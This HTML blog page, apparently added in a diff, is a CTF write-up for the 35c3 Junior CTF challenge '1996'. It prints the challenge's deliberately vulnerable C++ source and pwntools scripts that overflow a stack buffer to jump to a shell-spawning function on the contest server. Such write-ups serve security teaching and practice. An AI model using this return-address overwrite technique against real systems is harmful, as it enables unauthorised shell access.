@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>35c3 Junior CTF Pwn: 1996 - gi0cann&#39;s notes</title>
+  <meta property="og:title" content="35c3 Junior CTF Pwn: 1996" />
+  <meta name="twitter:title" content="35c3 Junior CTF Pwn: 1996" />
+  <meta name="description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the target running the binary was at 35.207.132.47:22227.
+1996.cpp:
+// compile with -no-pie -fno-stack-protector  #include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt; using namespace std; void spawn_shell() { char* args[] = {(char*)&#34;/bin/bash&#34;, NULL}; execve(&#34;/bin/bash&#34;, args, NULL); } int main() { char buf[1024]; cout &lt;&lt; &#34;Which environment variable do you want to read?">
+  <meta property="og:description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the target running the binary was at 35.207.132.47:22227.
+1996.cpp:
+// compile with -no-pie -fno-stack-protector  #include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt; using namespace std; void spawn_shell() { char* args[] = {(char*)&#34;/bin/bash&#34;, NULL}; execve(&#34;/bin/bash&#34;, args, NULL); } int main() { char buf[1024]; cout &lt;&lt; &#34;Which environment variable do you want to read?">
+  <meta name="twitter:description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the …">
+  <meta name="author" content="Some Person"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "gi0cann&#39;s notes",
+    
+    "url": "http://gi0cann.github.io/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "http://gi0cann.github.io/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "http://gi0cann.github.io/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "http://gi0cann.github.io/post/35c3juniorctf-1996/",
+          "name": "35c3 junior c t f pwn 1996"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "Some Person"
+  },
+  "headline": "35c3 Junior CTF Pwn: 1996",
+  "description" : "We are giving a zip file containing the following files &amp;ldquo;1996&amp;rdquo; and &amp;ldquo;1996.cpp&amp;rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the target running the binary was at 35.207.132.47:22227.
+1996.cpp:
+// compile with -no-pie -fno-stack-protector  #include &amp;lt;iostream&amp;gt;#include &amp;lt;unistd.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt; using namespace std; void spawn_shell() { char* args[] = {(char*)&amp;#34;/bin/bash&amp;#34;, NULL}; execve(&amp;#34;/bin/bash&amp;#34;, args, NULL); } int main() { char buf[1024]; cout &amp;lt;&amp;lt; &amp;#34;Which environment variable do you want to read?",
+  "inLanguage" : "en",
+  "wordCount": 426,
+  "datePublished" : "2018-12-30T21:08:42",
+  "dateModified" : "2018-12-30T21:08:42",
+  "image" : "http://gi0cann.github.io/img/avatar-icon.png",
+  "keywords" : [ "ctf, pwn, buffer overflow, stack overflow, linux" ],
+  "mainEntityOfPage" : "http://gi0cann.github.io/post/35c3juniorctf-1996/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "http://gi0cann.github.io/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "http://gi0cann.github.io/img/avatar-icon.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="35c3 Junior CTF Pwn: 1996" />
+<meta property="og:description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the target running the binary was at 35.207.132.47:22227.
+1996.cpp:
+// compile with -no-pie -fno-stack-protector  #include &lt;iostream&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt; using namespace std; void spawn_shell() { char* args[] = {(char*)&#34;/bin/bash&#34;, NULL}; execve(&#34;/bin/bash&#34;, args, NULL); } int main() { char buf[1024]; cout &lt;&lt; &#34;Which environment variable do you want to read?">
+<meta property="og:image" content="http://gi0cann.github.io/img/avatar-icon.png" />
+<meta property="og:url" content="http://gi0cann.github.io/post/35c3juniorctf-1996/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="gi0cann&#39;s notes" />
+  <meta name="twitter:title" content="35c3 Junior CTF Pwn: 1996" />
+  <meta name="twitter:description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the …">
+  <meta name="twitter:image" content="http://gi0cann.github.io/img/avatar-icon.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@gi0cann" />
+  <meta name="twitter:creator" content="@gi0cann" />
+  <link href='http://gi0cann.github.io/img/favicon.ico' rel='icon' type='image/x-icon'/>
+  <meta property="og:image" content="http://gi0cann.github.io/img/avatar-icon.png" />
+  <meta name="twitter:image" content="http://gi0cann.github.io/img/avatar-icon.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@gi0cann" />
+  <meta name="twitter:creator" content="@gi0cann" />
+  <meta property="og:url" content="http://gi0cann.github.io/post/35c3juniorctf-1996/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="gi0cann&#39;s notes" />
+
+  <meta name="generator" content="Hugo 0.53" />
+  <link rel="alternate" href="http://gi0cann.github.io/index.xml" type="application/rss+xml" title="gi0cann&#39;s notes">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="http://gi0cann.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+  <link rel="stylesheet" href="http://gi0cann.github.io/css/highlight.min.css" /><link rel="stylesheet" href="http://gi0cann.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="http://gi0cann.github.io/">gi0cann&#39;s notes</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="/tags">Tags</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="gi0cann&#39;s notes" href="http://gi0cann.github.io/">
+            <img class="avatar-img" src="http://gi0cann.github.io/img/avatar-icon.png" alt="gi0cann&#39;s notes" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>35c3 Junior CTF Pwn: 1996</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on December 30, 2018
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;2&nbsp;minutes
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;426&nbsp;words
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;Some Person
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <p>We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;.
+1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code.
+During the ctf the target running the binary was at 35.207.132.47:22227.</p>
+
+<p>1996.cpp:</p>
+<div class="highlight"><pre class="chroma"><code class="language-C++" data-lang="C++"><span class="c1">// compile with -no-pie -fno-stack-protector
+</span><span class="c1"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">spawn_shell</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+    <span class="n">execve</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+
+    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;Which environment variable do you want to read? &#34;</span><span class="p">;</span>
+    <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">buf</span><span class="p">;</span>
+
+    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">buf</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;=&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">getenv</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>This code contains is a classic stack based buffer vulnerability. At &ldquo;<code>cin &gt;&gt; buf;</code>&rdquo; user input is read into buf without checking the length of the input. Our goal here is to use this vulnerability to take control of the programs execution flow and jump to the &ldquo;spawn_shell&rdquo; to get a shell on the target.</p>
+
+<p>We can exploit this by feeding the program a long enough input to overwrite the return pointer(rbp+0x8) on the stack with the address of &ldquo;spawn_shell&rdquo; and take control of execution pointer (rip) to jump to the code want to execute.</p>
+
+<p>To figure out the length that our input needs to be to take control of rip we will generate a unique sequence of length 2000 to feed to the program. This unique sequence will allow us to figure out the exact length our input needs to be by looking at the value of the rip register when the program crashes.</p>
+
+<p>generate unique sequence:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># spawn process</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;1996&#39;</span><span class="p">)</span>
+<span class="c1"># read process out until we see a question mark followed by a space</span>
+<span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="s2">&#34;? &#34;</span><span class="p">)</span>
+<span class="c1"># generate unique sequences of length 2000</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span>
+<span class="c1"># send payload to process as input</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1"># switch to interactive mode</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
+<p>The code above will crash the program with the main function returning to 0x6161616e6161616d. We take the last 4 bytes of this value and feed it to the function cyclic_find. This will give us the index (1048) in our unique sequence where the value was found. This index plus another 8 bytes for the address of spawn_shell is the total length our payload needs to be to take control of the program.</p>
+
+<p>Next we disassemble the 1996 binary with radare2 to find the address of the spawn_shell function:
+<img src="/spawn_shell_addr.png" alt="spawn_shell address" /></p>
+
+<p>With this information we are ready to write our exploit.</p>
+
+<p>exploit:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;35.207.132.47&#39;</span><span class="p">,</span> <span class="mi">22227</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;? &#34;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">1048</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00400897</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div>
+<p>Executing our exploit gives us the following:</p>
+
+<p><img src="/exploit_1996.png" alt="exploit result" /></p>
+
+
+        
+          <div class="blog-tags">
+            
+              <a href="http://gi0cann.github.io//tags/ctf/">ctf</a>&nbsp;
+            
+              <a href="http://gi0cann.github.io//tags/pwn/">pwn</a>&nbsp;
+            
+              <a href="http://gi0cann.github.io//tags/buffer-overflow/">buffer overflow</a>&nbsp;
+            
+              <a href="http://gi0cann.github.io//tags/stack-overflow/">stack overflow</a>&nbsp;
+            
+              <a href="http://gi0cann.github.io//tags/linux/">linux</a>&nbsp;
+            
+          </div>
+        
+
+        
+            <hr/>
+            <section id="social-share">
+              <div class="list-inline footer-links">
+                
+
+<div class="share-box" aria-hidden="true">
+    <ul class="share">
+      
+      <li>
+        <a href="//twitter.com/share?url=http%3a%2f%2fgi0cann.github.io%2fpost%2f35c3juniorctf-1996%2f&amp;text=35c3%20Junior%20CTF%20Pwn%3a%201996&amp;via=gi0cann" target="_blank" title="Share on Twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//plus.google.com/share?url=http%3a%2f%2fgi0cann.github.io%2fpost%2f35c3juniorctf-1996%2f" target="_blank" title="Share on Google Plus">
+          <i class="fab fa-google-plus"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.facebook.com/sharer/sharer.php?u=http%3a%2f%2fgi0cann.github.io%2fpost%2f35c3juniorctf-1996%2f" target="_blank" title="Share on Facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//reddit.com/submit?url=http%3a%2f%2fgi0cann.github.io%2fpost%2f35c3juniorctf-1996%2f&amp;title=35c3%20Junior%20CTF%20Pwn%3a%201996" target="_blank" title="Share on Reddit">
+          <i class="fab fa-reddit"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.linkedin.com/shareArticle?url=http%3a%2f%2fgi0cann.github.io%2fpost%2f35c3juniorctf-1996%2f&amp;title=35c3%20Junior%20CTF%20Pwn%3a%201996" target="_blank" title="Share on LinkedIn">
+          <i class="fab fa-linkedin"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.stumbleupon.com/submit?url=http%3a%2f%2fgi0cann.github.io%2fpost%2f35c3juniorctf-1996%2f&amp;title=35c3%20Junior%20CTF%20Pwn%3a%201996" target="_blank" title="Share on StumbleUpon">
+          <i class="fab fa-stumbleupon"></i>
+        </a>
+      </li>
+  
+      
+      <li>
+        <a href="//www.pinterest.com/pin/create/button/?url=http%3a%2f%2fgi0cann.github.io%2fpost%2f35c3juniorctf-1996%2f&amp;description=35c3%20Junior%20CTF%20Pwn%3a%201996" target="_blank" title="Share on Pinterest">
+          <i class="fab fa-pinterest"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+  
+              </div>
+            </section>
+        
+
+        
+          
+          
+          <h4 class="see-also">See also</h4>
+          <ul>
+          
+            <li><a href="/post/35c3juniorctf-flags/">35c3 Junior CTF Pwn: flags</a></li>
+          
+            <li><a href="/post/x-masctf2018-our-christmas-wishlist/">X-MasCTF 2018 WEB: Our Christmas Wishlist</a></li>
+          
+            <li><a href="/post/x-masctf2018-endless-christmas/">X-MasCTF 2018 RE: Endless Christmas</a></li>
+          
+          </ul>
+          
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="http://gi0cann.github.io/post/35c3juniorctf-flags/" data-toggle="tooltip" data-placement="top" title="35c3 Junior CTF Pwn: flags">&larr; Previous Post</a>
+            </li>
+          
+          
+        </ul>
+      
+
+
+      
+        
+        
+      
+
+    </div>
+  </div>
+</div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="mailto:youremail@domain.com" title="Email me">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://github.com/gi0cann" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/gi0cann" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            
+            <a href="http://gi0cann.github.io/index.xml" title="RSS">
+            
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              <a href="gi0cann.github.io">Some Person</a>
+            
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2018
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="http://gi0cann.github.io/">gi0cann&#39;s notes</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo v0.53</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="http://gi0cann.github.io/js/main.js"></script>
+<script src="http://gi0cann.github.io/js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
+<script src="http://gi0cann.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
+
